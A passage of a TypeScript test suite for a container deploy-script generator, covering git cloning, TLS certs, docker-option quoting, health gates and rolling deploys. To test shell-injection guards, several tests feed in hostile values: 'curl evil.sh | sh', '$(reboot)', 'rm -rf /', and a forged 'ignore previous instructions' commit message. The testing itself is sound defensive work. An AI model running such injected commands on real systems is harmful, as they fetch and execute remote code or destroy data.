import {
  constraintExpr,
  spreadPrefExpr,
  buildImageRemoveScript,
  buildRestartScript,
  buildStartScript,
  buildProxySetupScript,
  buildPanelRouterWriteScript,
  buildProxyLogsScript,
  buildProxyRestartScript,
  buildProxyStatusScript,
  buildProxyStopScript,
  buildRemoveScript,
  buildRunScript,
  buildRegistryPushSteps,
  buildBuildOnlyScript,
  registryImageRef,
  buildRollingDeployScript,
  buildRecreateDeployScript,
  buildHealthGateFragment,
  resolveHealthProbe,
  resolveHealthGate,
  rolloutName,
  HEALTH_PROBE_IMAGE,
  PROXY_IMAGE,
  containerName,
  envFileContent,
  envFileB64,
  gitAuthUrl,
  runTag,
  parseImageDigest,
  parseCommit,
  buildPostDeployScript,
  staticDockerfile,
  staticNginxConf,
  traefikLabels,
  extraRouterName,
  dockerOptionsArgs,
  buildCustomCertYaml,
  buildCustomCertRemoveScript,
  isSshGitUrl,
  gitUrlHost,
  type AppSpec,
} from "./deploy-script";

const base: AppSpec = {
  id: "abc",
  image: "nginx:1.27",
  env: {},
  hostPort: null,
  containerPort: 80,
};

describe("SSH deploy-key git clone", () => {
  const KEY = "-----BEGIN OPENSSH PRIVATE KEY-----\nSECRETKEYMATERIAL\n-----END OPENSSH PRIVATE KEY-----\n";
  const sshApp: AppSpec = { ...base, source: "GIT", gitUrl: "git@github.com:acme/app.git", buildType: "DOCKERFILE", gitSshKey: KEY };

  it("isSshGitUrl recognises scp-style and ssh:// URLs, not https", () => {
    expect(isSshGitUrl("git@github.com:acme/app.git")).toBe(true);
    expect(isSshGitUrl("ssh://git@host:22/acme/app.git")).toBe(true);
    expect(isSshGitUrl("https://github.com/acme/app.git")).toBe(false);
  });

  it("gitUrlHost extracts the host from https / ssh / scp forms (lower-cased)", () => {
    expect(gitUrlHost("https://GitHub.com/acme/app.git")).toBe("github.com");
    expect(gitUrlHost("https://x-access-token@github.com/acme/app.git")).toBe("github.com");
    expect(gitUrlHost("git@gitlab.com:acme/app.git")).toBe("gitlab.com");
    expect(gitUrlHost("ssh://git@host.example:22/acme/app.git")).toBe("host.example");
    expect(gitUrlHost("not a url")).toBeNull();
  });

  it("clones with GIT_SSH_COMMAND (accept-new), key written 0600 via base64 — never in argv or the URL", () => {
    const s = buildRunScript(sshApp, "v1", true);
    expect(s).toContain("GIT_SSH_COMMAND=");
    expect(s).toContain("StrictHostKeyChecking=accept-new");
    expect(s).toContain('chmod 600 "$sd/id"');
    expect(s).toContain("base64 -d > \"$sd/id\"");
    expect(s).not.toContain("SECRETKEYMATERIAL"); // raw key never literal — only base64
    expect(s).toMatch(/git clone --depth 1 --branch '?main'? -- 'git@github\.com:acme\/app\.git'/);
  });

  it("an ssh repo with NO key fails clearly instead of cloning", () => {
    const s = buildRunScript({ ...sshApp, gitSshKey: null }, "v1", true);
    expect(s).toContain("no deploy key is set");
    expect(s).not.toContain("git clone");
  });
});

describe("monorepo base directory (build context/root = bd/baseDirectory)", () => {
  const BD = "/etc/tugra/builds/abc";
  const gitBase: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/acme/app.git", gitBranch: "main" };

  it("null baseDirectory is byte-identical to today (no guard, context = bd) for every build type", () => {
    const df = buildRunScript({ ...gitBase, buildType: "DOCKERFILE" }, "t", true);
    expect(df).not.toContain("TUGRA_BASE"); // no containment guard when there is no base
    expect(df).toContain(`-f '${BD}/Dockerfile' ${BD}`);
    expect(buildRunScript({ ...gitBase, buildType: "STATIC" }, "t", true)).toContain(`-f ${BD}/Dockerfile.tugra ${BD}`);
    expect(buildRunScript({ ...gitBase, buildType: "RAILPACK" }, "t", true)).toContain(`railpack build ${BD} --name`);
    expect(buildRunScript({ ...gitBase, buildType: "HEROKU" }, "t", true)).toContain(`--path ${BD} --builder`);
    expect(buildRunScript({ ...gitBase, buildType: "NIXPACKS" }, "t", true)).toMatch(/^nixpacks build .* \/etc\/tugra\/builds\/abc$/m); // root = bd (not the .plan.json path)
  });

  it("a base directory moves the build context/root and adds a symlink-containment guard", () => {
    const s = buildRunScript({ ...gitBase, buildType: "DOCKERFILE", baseDirectory: "apps/api" }, "t", true);
    // guard: resolve + stay inside the clone
    expect(s).toContain(`TUGRA_BASE=$(cd '${BD}/apps/api' 2>/dev/null && pwd -P)`);
    expect(s).toContain(`case "$TUGRA_BASE/" in "$TUGRA_BD"/*) ;;`);
    // build context + Dockerfile both under the subdirectory
    expect(s).toContain(`-f '${BD}/apps/api/Dockerfile' ${BD}/apps/api`);
    // clone + commit markers stay on the repo root
    expect(s).toContain(`git clone --depth 1 --branch 'main' -- 'https://github.com/acme/app.git' ${BD}`);
    expect(s).toContain(`git -C ${BD} rev-parse HEAD`);
  });

  it("base directory applies to STATIC / RAILPACK / HEROKU / NIXPACKS roots", () => {
    expect(buildRunScript({ ...gitBase, buildType: "STATIC", baseDirectory: "web" }, "t", true)).toContain(`-f ${BD}/web/Dockerfile.tugra ${BD}/web`);
    expect(buildRunScript({ ...gitBase, buildType: "RAILPACK", baseDirectory: "svc/api" }, "t", true)).toContain(`railpack build ${BD}/svc/api --name`);
    expect(buildRunScript({ ...gitBase, buildType: "HEROKU", baseDirectory: "svc/api" }, "t", true)).toContain(`--path ${BD}/svc/api --builder`);
    const nx = buildRunScript({ ...gitBase, buildType: "NIXPACKS", baseDirectory: "apps/api" }, "t", true);
    expect(nx).toMatch(/^nixpacks build .* \/etc\/tugra\/builds\/abc\/apps\/api$/m); // root moved to the subdir
    expect(nx).toContain(`${BD}.plan.json`); // the plan file stays OUTSIDE bd, unchanged
  });
});

describe("custom uploaded cert (certType custom + certPem/certKey)", () => {
  const cert: AppSpec = {
    ...base,
    domain: "shop.example.com",
    certType: "custom",
    certPem: "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----",
    certKey: "-----BEGIN PRIVATE KEY-----\nBBBB\n-----END PRIVATE KEY-----",
  };

  it("router gets tls=true with NO certresolver (Traefik serves the static cert by SNI)", () => {
    const labels = traefikLabels(cert);
    expect(labels).toContain("traefik.http.routers.tugra_abc.tls=true");
    expect(labels.join("\n")).not.toContain("tls.certresolver");
  });

  it("deploy writes the cert, key (0600) and tls yaml atomically into /dynamic", () => {
    const s = buildRunScript(cert, "v1");
    expect(s).toContain("mkdir -p -m 700 /etc/tugra/proxy-dynamic/certs");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.crt");
    // key written privately from birth (umask 077), never world-readable before the mv
    expect(s).toContain("(umask 077; printf %s");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.key");
    expect(s).toContain("/etc/tugra/proxy-dynamic/tls-abc.yml");
  });

  it("falls back to an ACME resolver (no cert files) when the key is missing — never a broken tls=true", () => {
    const noKey: AppSpec = { ...cert, certKey: null };
    const labels = traefikLabels(noKey);
    expect(labels.join("\n")).toContain("tls.certresolver");
    expect(labels.join("\n")).not.toContain("tls=true");
    expect(buildRunScript(noKey, "v1")).not.toContain("proxy-dynamic/certs");
  });

  it("a non-custom app is byte-identical — no cert files, keeps its resolver", () => {
    const le: AppSpec = { ...base, domain: "shop.example.com", certType: "le-http" };
    const s = buildRunScript(le, "v1");
    expect(s).not.toContain("proxy-dynamic/certs");
    expect(traefikLabels(le).join("\n")).toContain("tls.certresolver=le");
  });

  it("buildCustomCertYaml references the container-side cert/key paths", () => {
    const y = buildCustomCertYaml("abc");
    expect(y).toContain("certFile: /dynamic/certs/abc.crt");
    expect(y).toContain("keyFile: /dynamic/certs/abc.key");
  });

  it("buildCustomCertRemoveScript removes the yaml + cert + key", () => {
    const s = buildCustomCertRemoveScript("abc");
    expect(s).toContain("rm -f /etc/tugra/proxy-dynamic/tls-abc.yml");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.crt");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.key");
  });
});

describe("dockerOptionsArgs (shell-injection guard)", () => {
  it("preserves legitimate flags as separate shell-quoted argv tokens", () => {
    expect(dockerOptionsArgs("--cap-add=NET_ADMIN --pids-limit 100")).toBe("'--cap-add=NET_ADMIN' '--pids-limit' '100'");
  });

  it("keeps a quoted value with spaces as ONE token", () => {
    expect(dockerOptionsArgs('--label foo="bar baz"')).toBe("'--label' 'foo=bar baz'");
    expect(dockerOptionsArgs("--label foo='bar baz'")).toBe("'--label' 'foo=bar baz'");
  });

  it("NEUTRALIZES shell injection — metacharacters become literal argv, never execute", () => {
    const out = dockerOptionsArgs("--name x; curl evil.sh | sh");
    // each word is single-quoted; the shell sees no operators
    expect(out).toBe("'--name' 'x;' 'curl' 'evil.sh' '|' 'sh'");
    expect(out).not.toMatch(/[^']\|[^']/); // no bare pipe
    expect(out).not.toContain("; curl"); // no bare command separator
  });

  it("neutralizes command substitution — becomes a literal argv token", () => {
    expect(dockerOptionsArgs("$(reboot)")).toBe("'$(reboot)'");
    expect(dockerOptionsArgs("`reboot`")).toBe("'`reboot`'");
  });

  it("a single quote inside a double-quoted value is escaped by shq (no quote breakout)", () => {
    // input value contains a literal ' — shq must escape it so it can't break out of the quoting
    expect(dockerOptionsArgs('--label x="a\'b"')).toBe("'--label' 'x=a'\\''b'");
  });

  it("a stray unbalanced single quote fails closed (like a real shell), never executes", () => {
    expect(() => dockerOptionsArgs("a'b")).toThrow(/unterminated quote/);
  });

  it("empty / whitespace / null → empty string", () => {
    expect(dockerOptionsArgs(null)).toBe("");
    expect(dockerOptionsArgs(undefined)).toBe("");
    expect(dockerOptionsArgs("   ")).toBe("");
  });

  it("throws on an unterminated quote (fail closed)", () => {
    expect(() => dockerOptionsArgs('--label "oops')).toThrow(/unterminated quote/);
    expect(() => dockerOptionsArgs("--label 'oops")).toThrow(/unterminated quote/);
  });

  it("the built run command embeds the quoted opts, never the raw injection", () => {
    const s = buildRunScript({ ...base, dockerOptions: "--name x; touch /pwned" } as AppSpec, "v1");
    expect(s).toContain("'--name' 'x;' 'touch' '/pwned'");
    expect(s).not.toContain("x; touch /pwned"); // raw injection string is NOT present unquoted
  });
});

describe("host bind-mounts", () => {
  it("emits a shell-quoted -v for each host mount (`:ro` only when read-only)", () => {
    const s = buildRunScript(
      { ...base, hostMounts: [
        { hostPath: "/mnt/media", containerPath: "/media", readOnly: true },
        { hostPath: "/data/x", containerPath: "/x", readOnly: false },
      ] } as AppSpec,
      "v1",
    );
    expect(s).toContain("-v '/mnt/media:/media:ro'");
    expect(s).toContain("-v '/data/x:/x'");
  });
  it("emits nothing extra when there are no host mounts", () => {
    expect(buildRunScript(base, "v1")).not.toContain("/mnt/media");
  });
});

describe("digest pin", () => {
  it("an IMAGE deploy resolves + echoes the upstream digest right after pull", () => {
    const s = buildRunScript(base, "v1", true);
    expect(s).toContain("docker pull -q 'nginx:1.27'");
    expect(s).toContain("docker inspect --format '{{index .RepoDigests 0}}' 'nginx:1.27'");
    expect(s).toContain('echo "TUGRA_DIGEST=$TUGRA_D"');
    // set -e safe: guarded assignment + if/fi, never a bare `[ -n ] && echo`.
    expect(s).toContain('if [ -n "$TUGRA_D" ]; then');
    // the running container still uses the local versioned tag (unchanged behaviour).
    expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v1");
  });

  it("a GIT build never emits a digest marker (nothing upstream to pin)", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };
    const s = buildRunScript(git, "v1", true);
    expect(s).not.toContain("TUGRA_DIGEST");
    expect(s).not.toContain("RepoDigests");
  });

  it("parseImageDigest pulls the full ref, tolerates absence + noise", () => {
    expect(parseImageDigest("...\nTUGRA_DIGEST=nginx@sha256:abc123\n...")).toBe("nginx@sha256:abc123");
    expect(parseImageDigest("no marker here")).toBeNull();
    // first marker wins if two ever appear
    expect(parseImageDigest("TUGRA_DIGEST=a@sha256:1\nTUGRA_DIGEST=b@sha256:2")).toBe("a@sha256:1");
  });
});

describe("commit metadata (feature B)", () => {
  const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };

  it("a GIT build echoes the commit marker right after the clone, before the build", () => {
    const s = buildRunScript(git, "v1", true);
    expect(s).toContain("git -C /etc/tugra/builds/abc rev-parse HEAD");
    expect(s).toContain('echo "TUGRA_COMMIT=$TUGRA_C"');
    expect(s).toContain("git -C /etc/tugra/builds/abc log -1 --format=%s");
    expect(s).toContain('echo "TUGRA_COMMIT_MSG_B64=$TUGRA_CM"');
    // set -e safe: the assignment is guarded with `|| true`.
    expect(s).toContain("rev-parse HEAD 2>/dev/null || true");
    // emitted UNCONDITIONALLY and BEFORE the build so the real marker always precedes user output (first
    // anchored match wins) and build noise can't push it past the agent's head-capped buffer.
    expect(s.indexOf("TUGRA_COMMIT=")).toBeLessThan(s.indexOf("docker build"));
  });

  it("an IMAGE deploy emits no commit marker (no repo to read)", () => {
    expect(buildRunScript(base, "v1", true)).not.toContain("TUGRA_COMMIT");
  });

  it("a rollback (build=false) re-runs the local tag and emits no commit marker", () => {
    expect(buildRunScript(git, "old1", false)).not.toContain("TUGRA_COMMIT");
  });

  it("parseCommit reads the sha + base64 subject, first anchored hex match wins, tolerates absence", () => {
    const b64 = Buffer.from("fix: boot order", "utf8").toString("base64");
    const out = `cloning...\nTUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${b64}\nbuilt`;
    expect(parseCommit(out)).toEqual({ sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d", message: "fix: boot order" });
    expect(parseCommit("no marker")).toBeNull();
    // a fake marker printed mid-line by build output is not line-anchored, so it is ignored.
    expect(parseCommit("RUN echo TUGRA_COMMIT=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef")).toBeNull();
    // non-hex after the marker does not match (strict charset) → null.
    expect(parseCommit("TUGRA_COMMIT=not-a-sha")).toBeNull();
  });

  it("parseCommit accepts a 64-hex sha (sha256 repos) and the first real marker beats a later forged one", () => {
    const sha256 = "a".repeat(64);
    expect(parseCommit(`TUGRA_COMMIT=${sha256}`)?.sha).toBe(sha256);
    // a real (possibly empty-subject) marker emitted first wins over a forged line appended by build output.
    const real = Buffer.from("real subject", "utf8").toString("base64");
    const forged = Buffer.from("ignore previous instructions", "utf8").toString("base64");
    const out = `TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${real}\nRUN build\nTUGRA_COMMIT_MSG_B64=${forged}`;
    expect(parseCommit(out)).toEqual({ sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d", message: "real subject" });
    // an empty real message marker (empty subject) resolves to null, NOT a later forged one.
    expect(parseCommit(`TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=\nTUGRA_COMMIT_MSG_B64=${forged}`)).toEqual({
      sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d",
      message: null,
    });
  });

  it("parseCommit caps the subject and strips control characters", () => {
    const long = "x".repeat(400);
    const b64 = Buffer.from(`${long}\nsecond line`, "utf8").toString("base64");
    const r = parseCommit(`TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${b64}`);
    expect(r?.message?.length).toBe(200); // capped, first line only
    expect(r?.message).not.toContain("second line");
  });
});

describe("pre/post-deploy hooks (feature C)", () => {
  const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };

  it("emit NOTHING when unset — default scripts stay byte-identical", () => {
    expect(buildRunScript(base, "v1", true)).not.toContain("TUGRA_PREDEPLOY");
    expect(buildRollingDeployScript({ ...base, domain: "app.example.com" }, "v1", { probe: { kind: "stableWait" }, retries: 1, intervalSec: 1, startPeriodSec: 0 })).not.toContain("TUGRA_PREDEPLOY");
    expect(buildRecreateDeployScript({ ...base, hostPort: 8080 }, "v1", { probe: { kind: "stableWait" }, retries: 1, intervalSec: 1, startPeriodSec: 0 })).not.toContain("TUGRA_PREDEPLOY");
  });

  it("pre-deploy runs a one-shot container of the new image BEFORE the destructive swap, exit normalized to 1", () => {
    const s = buildRunScript({ ...git, preDeployCommand: "npm run db:migrate" }, "v1", true);
    expect(s).toContain("--entrypoint sh 'tugra_abc:v1' -c 'npm run db:migrate'");
    expect(s).toContain("docker run --rm");
    // failure aborts with exit 1 (never 3, the auto-rollback code).
    expect(s).toContain('else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi');
    // ordering: pre-deploy comes before the container is removed/started.
    expect(s.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(s.indexOf("docker rm -f"));
  });

  it("shell-quotes a pre-deploy command so it cannot break out of the deploy sh -c", () => {
    const s = buildRunScript({ ...git, preDeployCommand: "echo 'hi'; rm -rf /" }, "v1", true);
    // single-quote escaping: ' becomes '\'' — the whole command is one literal argument to sh -c.
    expect(s).toContain("-c 'echo '\\''hi'\\''; rm -rf /'");
  });

  it("a rollback (build=false) never re-runs the pre-deploy hook", () => {
    expect(buildRunScript({ ...git, preDeployCommand: "npm run db:migrate" }, "old1", false)).not.toContain("TUGRA_PREDEPLOY");
  });

  it("pre-deploy sits before the destructive step AND before set +e in the rolling and recreate builders, exit 1 only", () => {
    const gate = { retries: 1, intervalSec: 1, startPeriodSec: 0 };
    const rolling = buildRollingDeployScript({ ...git, domain: "app.example.com", preDeployCommand: "migrate" }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeGreaterThan(-1);
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(rolling.indexOf("docker rm -f"));
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(rolling.indexOf("set +e"));
    const recreate = buildRecreateDeployScript({ ...git, hostPort: 8080, preDeployCommand: "migrate" }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect(recreate.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(recreate.indexOf("docker rm -f"));
    expect(recreate.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(recreate.indexOf("set +e"));
    // failure branch must exit 1 (never 3 — the hub reads 3 as auto-rollback).
    const frag = rolling.slice(rolling.indexOf("TUGRA_PREDEPLOY: running"), rolling.indexOf("docker rm -f"));
    expect(frag).toContain("exit 1; fi");
    expect(frag).not.toContain("exit 3");
  });

  it("pre-deploy container carries the env-file, DB network and volumes but not --name/--restart/labels", () => {
    const app = {
      ...git,
      env: { A: "1" },
      dbNetwork: true,
      volumes: [{ name: "data", path: "/data" }],
      hostMounts: [{ hostPath: "/srv/x", containerPath: "/m", readOnly: true }],
      preDeployCommand: "migrate",
    } as AppSpec;
    const line = buildRunScript(app, "v1", true).split("\n").find((l) => l.includes("--entrypoint sh"))!;
    expect(line).toContain("--env-file /etc/tugra/env/abc.env");
    expect(line).toContain("--network tugra-net");
    expect(line).toContain(":/data");
    expect(line).toContain("'/srv/x:/m:ro'");
    expect(line).not.toContain("--name");
    expect(line).not.toContain("--restart");
    expect(line).not.toContain("--label");
  });

  it("buildPostDeployScript execs inside the live container, best-effort (failure ignored)", () => {
    const s = buildPostDeployScript({ ...base, postDeployCommand: "curl -fsS https://x/notify" });
    expect(s).toContain("docker exec tugra_abc sh -c 'curl -fsS https://x/notify'");
    expect(s).toContain('|| echo "TUGRA_POSTDEPLOY: failed (ignored)"');
  });
});

describe("deploy-script", () => {
  it("names the container + versioned image tag deterministically", () => {
    expect(containerName({ id: "abc" })).toBe("tugra_abc");
    expect(runTag({ id: "abc" }, "v1")).toBe("tugra_abc:v1");
    expect(rolloutName({ id: "abc" })).toBe("tugra_abc__rollout");
  });

  describe("rolling deploy", () => {
    const domained: AppSpec = { ...base, domain: "app.example.com" };
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };

    it("starts the new version under a temp name with the SAME Traefik labels", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      // built + run under the rollout name, not the canonical one
      expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v2");
      expect(s).toContain("docker run -d --name tugra_abc__rollout");
      // labels still register the canonical router/service (app-stable → overlap works)
      expect(s).toContain("traefik.http.routers.tugra_abc.rule=Host(`app.example.com`)");
      expect(s).toContain("--network tugra-proxy");
      // the rollout carries a Traefik LB health check so it stays OUT of rotation until
      // ready — otherwise Traefik would route live traffic to the booting container (502s)
      expect(s).toContain("traefik.http.services.tugra_abc.loadbalancer.healthcheck.path=/");
      expect(s).toContain("traefik.http.services.tugra_abc.loadbalancer.healthcheck.interval=3s");
    });

    it("gate-accepted >=400 probe: live container is re-created WITHOUT the LB check label (no 503 after rename)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain('if [ "$code" -ge 400 ]; then');
      const runs = s.split("\n").filter((l) => l.includes("docker run -d --name"));
      const rollout = runs.find((l) => l.includes("--name tugra_abc__rollout"))!;
      const live = runs.find((l) => l.includes("--name tugra_abc "))!;
      expect(rollout).toContain("loadbalancer.healthcheck.path=/");
      expect(live).toBeDefined();
      expect(live).not.toContain("loadbalancer.healthcheck");
      expect(live).toContain("traefik.http.routers.tugra_abc.rule=Host(`app.example.com`)"); // same routing
      // happy path (2xx/3xx) still renames the gated rollout into place
      expect(s).toContain("docker rename tugra_abc__rollout tugra_abc");
    });

    it("non-httpExternal (stableWait) rolling probe emits no >=400 relabel branch (no $code available)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain('"$code" -ge 400');
    });

    it("a hard-cutover (non-rolling) deploy carries NO LB health check (no regression)", () => {
      const s = buildRunScript(domained, "v1");
      expect(s).not.toContain("loadbalancer.healthcheck");
    });

    it("on health-pass removes the OLD container and renames the new one in (exit 0)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain('if [ "$healthy" = 1 ]; then');
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker rename tugra_abc__rollout tugra_abc");
      expect(s).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
    });

    it("on health-fail removes the NEW container, keeps the old one, and exits 3", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain("docker rm -f tugra_abc__rollout 2>/dev/null || true");
      expect(s).toContain('echo "TUGRA_ROLLOUT: rolled_back"; exit 3');
      // the health gate runs under set +e so a failed probe doesn't abort the swap logic
      expect(s).toContain("set +e");
    });

    it("build=false (rollback) skips the build/pull prep", () => {
      const s = buildRollingDeployScript(domained, "old1", { build: false, probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain("docker pull");
      expect(s).not.toContain("docker tag");
      expect(s).toContain("docker run -d --name tugra_abc__rollout");
    });

    it("httpExternal probe hits the pinned probe image over the proxy network", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 3000, path: "/healthz" }, ...gate });
      expect(s).toContain(
        `docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc__rollout:3000/healthz'`,
      );
      // any HTTP response < 500 = reachable/serving (booted apps 404/401 on the probe path)
      expect(s).toContain(`if [ "$code" != "000" ] && [ "$code" -lt 500 ]; then healthy=1; break; fi`);
      expect(s).toContain(`for i in $(seq 1 ${gate.retries}); do`);
      expect(s).toContain(`sleep ${gate.startPeriodSec}`);
    });

    it("native probe polls docker's container health status", () => {
      const s = buildRollingDeployScript({ ...domained, healthCmd: "curl -f http://localhost/ || exit 1" }, "v2", {
        probe: { kind: "native" },
        ...gate,
      });
      expect(s).toContain("docker inspect --format '{{json .State.Health.Status}}' tugra_abc__rollout");
      expect(s).toContain("--health-cmd 'curl -f http://localhost/ || exit 1'"); // container carries the health-cmd
    });

    it("resolveHealthProbe auto (type unset): healthCmd→native, domain→httpExternal, else stableWait", () => {
      expect(resolveHealthProbe({ ...base, healthCmd: "x" })).toEqual({ kind: "native" });
      expect(resolveHealthProbe({ ...base, domain: "x.com", containerPort: 3000 })).toEqual({
        kind: "httpExternal",
        port: 3000,
        path: "/",
        expectedStatus: null,
        timeoutSec: 5,
      });
      expect(resolveHealthProbe(base)).toEqual({ kind: "stableWait" });
    });

    it("resolveHealthProbe honours explicit type/path/port config", () => {
      // explicit CMD → native (even without auto-derivation)
      expect(resolveHealthProbe({ ...base, healthCheckType: "CMD", healthCmd: "x" })).toEqual({ kind: "native" });
      // explicit NONE overrides an auto-HTTP domain app → liveness only
      expect(resolveHealthProbe({ ...base, domain: "x.com", healthCheckType: "NONE" })).toEqual({ kind: "stableWait" });
      // HTTP with custom path + port on a routed app (proxy network, container name)
      expect(resolveHealthProbe({ ...base, domain: "x.com", healthCheckType: "HTTP", healthCheckPath: "/up", healthCheckPort: 9000 })).toEqual({
        kind: "httpExternal",
        port: 9000,
        path: "/up",
        expectedStatus: null,
        timeoutSec: 5,
      });
      // HTTP on a host-port app probes localhost over the host network, pinned to the app's
      // OWN published port — a custom healthCheckPort is IGNORED so it can't scan other ports
      expect(resolveHealthProbe({ ...base, hostPort: 8080, healthCheckType: "HTTP", healthCheckPath: "/health", healthCheckPort: 9999 })).toEqual({
        kind: "httpExternal",
        port: 8080,
        path: "/health",
        onHost: true,
        expectedStatus: null,
        timeoutSec: 5,
      });
      // HTTP configured but nothing reachable (no domain, no host port) → liveness wait
      expect(resolveHealthProbe({ ...base, healthCheckType: "HTTP" })).toEqual({ kind: "stableWait" });
    });

    it("a host-port HTTP probe uses the host network + localhost (not the proxy), single-quoted URL", () => {
      const s = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 8080, path: "/health", onHost: true }, gate);
      const joined = s.join("\n");
      expect(joined).toContain(`docker run --rm --network host ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://localhost:8080/health'`);
      expect(joined).not.toContain("tugra-proxy");
    });

    it("resolveHealthGate uses rolling defaults, overridden per app", () => {
      expect(resolveHealthGate(base)).toEqual({ retries: 20, intervalSec: 3, startPeriodSec: 5 });
      expect(resolveHealthGate({ ...base, healthRetries: 40, healthInterval: 6, healthStartPeriod: 90 })).toEqual({ retries: 40, intervalSec: 6, startPeriodSec: 90 });
    });

    it("HTTP probe: default passes any code < 500; an expectedStatus requires exactly that code; timeout is tunable", () => {
      const def = buildHealthGateFragment("t", { kind: "httpExternal", port: 80, path: "/" }, gate).join("\n");
      expect(def).toContain(`[ "$code" != "000" ] && [ "$code" -lt 500 ]`);
      const exact = buildHealthGateFragment("t", { kind: "httpExternal", port: 80, path: "/", expectedStatus: 200, timeoutSec: 20 }, gate).join("\n");
      expect(exact).toContain(`[ "$code" = "200" ]`);
      expect(exact).toContain("--max-time 20");
      expect(exact).not.toContain("-lt 500");
    });

    it("docker --health-* flags use per-app timings, else defaults", () => {
      const def = buildRunScript({ ...base, healthCmd: "curl -f localhost/health" }, "v1", false);
      expect(def).toContain("--health-interval=10s");
      expect(def).toContain("--health-start-period=30s");
      const tuned = buildRunScript({ ...base, healthCmd: "curl -f localhost/health", healthInterval: 20, healthTimeout: 8, healthRetries: 5, healthStartPeriod: 120 }, "v1", false);
      expect(tuned).toContain("--health-interval=20s");
      expect(tuned).toContain("--health-timeout=8s");
      expect(tuned).toContain("--health-retries=5");
      expect(tuned).toContain("--health-start-period=120s");
    });
  });

  describe("recreate deploy", () => {
    const hostPortApp: AppSpec = { ...base, hostPort: 8080, containerPort: 80 };
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };

    it("recreates on the canonical name (NO rollout temp container)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      // stop old, start new under the SAME canonical name — no __rollout overlap container
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker run -d --name tugra_abc");
      expect(s).not.toContain("__rollout");
      // host-port app publishes its port
      expect(s).toContain("-p 8080:80");
    });

    it("guards the new container's START so a docker-run failure falls through to rollback (not a set -e abort)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "prevdep", probe: { kind: "stableWait" }, ...gate });
      // set +e is raised BEFORE the run, and the run itself is guarded by `if` so a daemon
      // rejection (port clash, bad flag) doesn't abort the script before the rollback branch
      const setPlusE = s.indexOf("set +e");
      const run = s.indexOf("if docker run -d --name tugra_abc");
      expect(setPlusE).toBeGreaterThan(-1);
      expect(run).toBeGreaterThan(setPlusE); // guarded run comes after set +e
      expect(s).toContain("  healthy=0"); // start-failed → treated as unhealthy → rollback
    });

    it("on health-pass just keeps the new container (exit 0)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      expect(s).toContain('if [ "$healthy" = 1 ]; then');
      expect(s).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
      // the gate runs under set +e so a failed probe doesn't abort the rollback logic
      expect(s).toContain("set +e");
    });

    it("on health-fail with a previous version: removes the new, re-runs the old image, exit 3", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "prevdep", probe: { kind: "stableWait" }, ...gate });
      // drop the unhealthy new container, then re-run the retained previous image under canonical
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker run -d --name tugra_abc");
